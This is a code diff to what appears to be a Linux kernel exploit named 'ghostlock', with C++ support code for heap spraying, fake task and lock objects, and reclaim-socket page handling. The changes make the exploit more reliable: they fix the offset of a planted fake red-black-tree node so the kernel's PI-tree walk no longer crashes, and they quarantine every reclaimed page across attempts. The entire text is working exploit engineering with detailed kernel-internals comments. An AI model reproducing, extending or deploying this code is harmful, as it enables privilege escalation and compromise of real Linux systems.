@@ -394,6 +394,11 @@ namespace ghostlock::support {
         size_t fake_task_off = tcp_layout ? kernel::TCP_FAKE_TASK_OFF : static_cast<size_t>(kernel::FAKE_TASK_OFF);
 
         uintptr_t payload_base = base + static_cast<uintptr_t>(payload_delta);
+        /* Offsets written through `p` live in payload_base space, but the write
+         * value is page_base + RELINK_NODE_OFF. page_base sits this far above
+         * payload_base: SKB_DATA_DELTA = -0xe80 on the unix-socket route, 0 on
+         * the tcp route (which is why fake_lock == page_base in the route log). */
+        const size_t page_base_off = static_cast<size_t>(-payload_delta);
 
         (session::g_exploit_session.heap.current.fake_lock) = payload_base + kernel::LOCK_OFF;
         (session::g_exploit_session.heap.current.fake_w0) = payload_base + kernel::W0_OFF;
@@ -438,11 +443,18 @@ namespace ghostlock::support {
              * *(*(parent)) as the grandparent, so every word the kernel can
              * mistake for a node holds an odd value: 1 is a self-consistent
              * black node (parent 0, no children) that ends the walk on the
-             * first read instead of dereferencing a zero grandparent. */
-            put64(p, 0x00, 1); /* payload base: page-aligned node candidate */
-            put64(p, kernel::RELINK_NODE_OFF + 0x00, 1); /* tree_pc target */
-            put64(p, kernel::RELINK_NODE_OFF + 0x08, 0);
-            put64(p, kernel::RELINK_NODE_OFF + 0x10, 0);
+             * first read instead of dereferencing a zero grandparent.
+             *
+             * The word the walk reads is *(page_base + RELINK_NODE_OFF), which
+             * in this offset space is p + page_base_off + RELINK_NODE_OFF.
+             * Planting it at p + RELINK_NODE_OFF (the first form of this carpet)
+             * left that word zero: rb_is_black() stayed false, gparent became
+             * *(value) = 0 and rb_insert_color() faulted reading gparent->rb_right
+             * -- the 0x8 oops this carpet exists to stop. */
+            put64(p, 0x00, 1); /* payload base: node candidate */
+            put64(p, page_base_off + kernel::RELINK_NODE_OFF + 0x00, 1); /* page_base + relink */
+            put64(p, page_base_off + kernel::RELINK_NODE_OFF + 0x08, 0);
+            put64(p, page_base_off + kernel::RELINK_NODE_OFF + 0x10, 0);
 
             if (compact) {
                 /* Words ride the erase relink: pc = value, rb_left = dest,
@@ -545,6 +557,31 @@ namespace ghostlock::support {
         return 1;
     }
 
+    /* Retire the live page instead of releasing it. A lost race can leave one of
+     * this page's addresses linked into a PI tree; closing the reclaim sockets
+     * hands the page back to the allocator, the stale node then reads back as
+     * zero, and the next rb_insert_color() walk dereferences the NULL grandparent
+     * (the fault at address 0x8). Every retired page stays readable for the rest
+     * of the run: the fds stay open, and the fork-hold at exit keeps them past the
+     * process. Quarantining only the last page was not enough -- an attempt ladder
+     * can retire four or more, and a node from any of them can be the one the next
+     * walk lands on. */
+    static void park_reclaim_page(void) {
+        memory::HeapContext &heap = session::g_exploit_session.heap;
+        if (!heap.current.has_reclaim()) {
+            return;
+        }
+        if (heap.held_count >= heap.held.size()) {
+            pr_warning("payload page hold is full (%zu pages); releasing this page\n",
+                       heap.held.size());
+            close_reclaim_sockets();
+            return;
+        }
+        (void) heap.current.move_to(heap.held[heap.held_count],
+                                    memory::PayloadPageState::Quarantined);
+        heap.held_count += 1;
+    }
+
     /* TODO(CPP07-OWNER): partial prepare failure injection still needs a
      * syscall-level fault-injection framework; the ownership refactor itself is
      * complete (CPP12h). Completion: add the framework, cover the early-exit
@@ -555,17 +592,7 @@ namespace ghostlock::support {
         /* Release every userspace reference from the preceding write before the
          * context arrays are replaced. Keeping the final post-spray memfd pinned
          * leaked one mm_struct per stage and progressively poisoned later sprays. */
-        /* Drop the page before the previous one, then quarantine rather than
-         * close the previous one. A lost race can leave one of that page's
-         * addresses linked into a PI tree, and closing the reclaim sockets hands
-         * the page back to the allocator: the stale node then reads back as zero,
-         * which is exactly the red node with no grandparent that turns the next
-         * rb_insert_color walk into a fault or an endless loop. Holding one page
-         * keeps the planted black node readable while the bound on pinned memory
-         * stays the same. */
-        release_quarantined_reclaim_sockets();
-        (void) quarantine_reclaim_sockets();
-        close_reclaim_sockets();
+        park_reclaim_page();
         cleanup_page_prepare_state();
         mm_objs_per_slab = kernel::ORDER3_SIZE /
                            session::g_exploit_session.profile.mm_struct_stride(kernel::MM_STRUCT_SZ);
